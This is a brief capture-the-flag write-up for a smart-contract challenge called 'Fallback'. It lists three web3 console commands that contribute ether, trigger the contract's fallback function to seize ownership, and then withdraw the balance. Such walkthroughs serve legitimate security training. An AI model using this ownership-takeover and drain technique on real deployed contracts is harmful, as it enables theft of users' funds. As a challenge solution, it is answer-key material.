# 1. Fallback

Goal :

- claim ownership of the contract
- reduce its balance to 0

````
// we need to contribute so we can call the fallback function
> await contract.contribute.sendTransaction({from:player, value:web3.utils.toWei('0.0001', 'ether')})
// call the callback function which will make us the owner of the contract
> await web3.eth.sendTransaction({from:player, to:contract.address, value:web3.utils.toWei('0.0001', 'ether')})
// as the owner, withdraw the eth stored
> await contract.withdraw()
````

Useful link :

- https://ethereum.stackexchange.com/questions/53094/sending-ether-via-contract-instance